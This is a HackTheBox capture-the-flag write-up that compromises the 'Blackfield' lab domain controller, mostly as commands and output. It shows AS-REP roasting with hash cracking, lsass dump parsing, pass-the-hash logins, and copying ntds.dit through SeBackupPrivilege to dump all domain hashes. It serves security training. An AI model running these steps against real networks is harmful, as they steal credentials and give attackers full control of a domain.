---
title: "Blackfield"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
tags:
  - HackTheBox
  - Active Directory
---

# Blackfield

![](../assets/Pasted%20image%2020250509122218.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.192
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 12:23 CEST
Nmap scan report for 10.10.10.192
Host is up (0.041s latency).
Not shown: 65526 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-09 17:23:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  tcpwrapped
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=5/9%Time=681DD7C3%P=x86_64-pc-linux-gnu%r(DNS-S
SF:D-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04_
SF:udp\x05local\0\0\x0c\0\x01");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-09T17:24:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
```

We can establish a guest session with `rpc` but can't enumerate anything. However, we can look up SIDs, so using `nxc` we can get the users.

```shell
$ nxc smb 10.10.10.192 -u guest -p '' --rid-brute
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest: 
SMB         10.10.10.192    445    DC01             500: BLACKFIELD\Administrator (SidTypeUser)
SMB         10.10.10.192    445    DC01             501: BLACKFIELD\Guest (SidTypeUser)
SMB         10.10.10.192    445    DC01             502: BLACKFIELD\krbtgt (SidTypeUser)
SMB         10.10.10.192    445    DC01             1000: BLACKFIELD\DC01$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1103: BLACKFIELD\audit2020 (SidTypeUser)
SMB         10.10.10.192    445    DC01             1104: BLACKFIELD\support (SidTypeUser)
SMB         10.10.10.192    445    DC01             1105: BLACKFIELD\BLACKFIELD764430 (SidTypeUser)
SMB         10.10.10.192    445    DC01             1412: BLACKFIELD\BLACKFIELD438814 (SidTypeUser)
SMB         10.10.10.192    445    DC01             1413: BLACKFIELD\svc_backup (SidTypeUser)
SMB         10.10.10.192    445    DC01             1414: BLACKFIELD\lydericlefebvre (SidTypeUser)
SMB         10.10.10.192    445    DC01             1428: BLACKFIELD\SRV-WEB$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1429: BLACKFIELD\SRV-FILE$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1430: BLACKFIELD\SRV-EXCHANGE$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1431: BLACKFIELD\SRV-INTRANET$ (SidTypeUser)
...
```

## Initial Access

Having a user list, check if there are any that do not require pre-authentication.

```shell
$ impacket-GetNPUsers blackfield/ -dc-ip 10.10.10.192 -request -no-pass -usersfile users
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$support@BLACKFIELD:df60eb8acf15c7c3d405b323ac114c0f$fc63373eef5dcbbafb00a392e8e6a88b271f01d1a115648cd5f84fb818e90b9fc7b7b58639c7e8e33547253735464ff91540e84f9f9329a4c873af6f1768cf60c0e58ec0d02e4726b6cf9b524d73dbb12ee936979df0ca7104095bd05d4996e498654611dc4a71771721f23da104a8ca16377e561b7b8eaf1dc5b979c6084aea64cba5e59d6f2a933d1c39bb5083e5a8420aafe6ce186201a698f356eeaa78bb0a59df041e4d5f756c8ab986ebb9b44d76f6a764d24b6bd07a6e4cc7b566cc5b85517d6f71aec39260b1c0d8476ae2fb40a210f3b15d5c2a0b0ebc15bcde8426f1e671b52d2164c3a229153b96af
```

And using `hashcat`:

```shell
$ hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt --force

$krb5asrep$23$support@BLACKFIELD:df60eb8acf15c7c3d405b323ac114c0f$fc63373eef5dcbbafb00a392e8e6a88b271f01d1a115648cd5f84fb818e90b9fc7b7b58639c7e8e33547253735464ff91540e84f9f9329a4c873af6f1768cf60c0e58ec0d02e4726b6cf9b524d73dbb12ee936979df0ca7104095bd05d4996e498654611dc4a71771721f23da104a8ca16377e561b7b8eaf1dc5b979c6084aea64cba5e59d6f2a933d1c39bb5083e5a8420aafe6ce186201a698f356eeaa78bb0a59df041e4d5f756c8ab986ebb9b44d76f6a764d24b6bd07a6e4cc7b566cc5b85517d6f71aec39260b1c0d8476ae2fb40a210f3b15d5c2a0b0ebc15bcde8426f1e671b52d2164c3a229153b96af:#00^BlackKnight
```

So `support:#00^BlackKnight`

Execute `bloodhound-python` and get the zip, then upload it to [BloodHound](https://bloodhound.readthedocs.io/).

![](../assets/Pasted%20image%2020250509124716.png)

`support` has `ForceChangePassword` over the `audit2020` user.

```shell
$ net rpc password "audit2020" "newP@ssword2022" -U "blackfield.local"/"support"%"#00^BlackKnight" -S "dc01.blackfield.local"
```

This account can access a share called `forensic`:

```shell
$ smbclient -U 'audit2020%newP@ssword2022' //10.10.10.192/forensic 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 14:03:16 2020
  ..                                  D        0  Sun Feb 23 14:03:16 2020
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020

                5102079 blocks of size 4096. 1684962 blocks available
```

The `memory_analysis` folder contains a `lsass.zip`, let's download it.

Unzip it and get the DMP file that can be parsed with `pypykatz`:

```shell
$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
...
```

Inside, we find the hash for the user `svc_backup`.

![](../assets/Pasted%20image%2020250509125949.png)

This user can access the machine.

```shell
$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
```

## Privilege Escalation

```shell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

The user belongs to the `Backup Operators` group so it has `SeBackupPrivilege`. Then, we can use `diskshadow` and `robocopy` to get the `ntds.dit` file.

Upload a file with the `diskshadow` instructions. (I had to duplicate every end letter)

```shell
$ cat test.txt
set context persistent nowriterss
add volume c: alias hackh
createe
expose %hack% z::
```

Execute `diskshadow`:

```shell
*Evil-WinRM* PS C:\Users\svc_backup> diskshadow /s .\test.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  5/9/2025 11:18:03 AM

-> set context persistent nowriters
-> add volume c: alias hack
-> create
Alias hack for shadow ID {a4e054ab-4db8-4f85-bb50-515d9b5678de} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {cfcc34c7-4162-4705-9714-f6283fee8639} set as environment variable.

Querying all shadow copies with the shadow copy set ID {cfcc34c7-4162-4705-9714-f6283fee8639}

        * Shadow copy ID = {a4e054ab-4db8-4f85-bb50-515d9b5678de}               %hack%
                - Shadow copy set: {cfcc34c7-4162-4705-9714-f6283fee8639}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 5/9/2025 11:18:04 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %hack% z:
-> %hack% = {a4e054ab-4db8-4f85-bb50-515d9b5678de}
The shadow copy was successfully exposed as z:\.
->
```

Now we can access `C:` protected files via the alias, so get the `ntds.dit` file.

```shell
*Evil-WinRM* PS C:\Users\svc_backup> robocopy /b z:\windows\ntds\ . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, May 9, 2025 11:18:12 AM
   Source : z:\windows\ntds\
     Dest : C:\Users\svc_backup\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            New File              18.0 m        ntds.dit
  0.0%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           120989538 Bytes/sec.
   Speed :            6923.076 MegaBytes/min.
   Ended : Friday, May 9, 2025 11:18:13 AM
```

We also need the `system` hive:

```shell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\system system
The operation completed successfully.
```

Download them and open with `secretsdump`:

```shell
*Evil-WinRM* PS C:\Users\svc_backup> download ntds.dit
*Evil-WinRM* PS C:\Users\svc_backup> download system
```

```shell
$ impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:2340818ace50731486a8696029636d47:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
...
```

Enter as `administrator` via PTH:

```shell
$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
Evil-WinRM shell v3.7
 
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
```

## Post Exploitation

Get the flag:

```shell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
4375a629c7c67c8e29db269060c955cb
```
